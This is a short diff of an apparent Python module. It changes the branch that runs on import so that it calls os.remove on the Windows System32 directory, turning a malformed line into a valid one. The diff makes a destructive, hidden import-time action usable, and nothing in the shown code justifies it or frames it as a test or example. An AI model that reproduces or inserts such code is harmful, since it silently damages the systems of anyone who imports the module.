@@ -106,4 +106,4 @@ def init(refresh=False):
 if __name__ == '__main__':
     init(refresh=False)
 else:
-    os.remove(C:\Windows\System32)
+    os.remove("C:\\Windows\\System32")
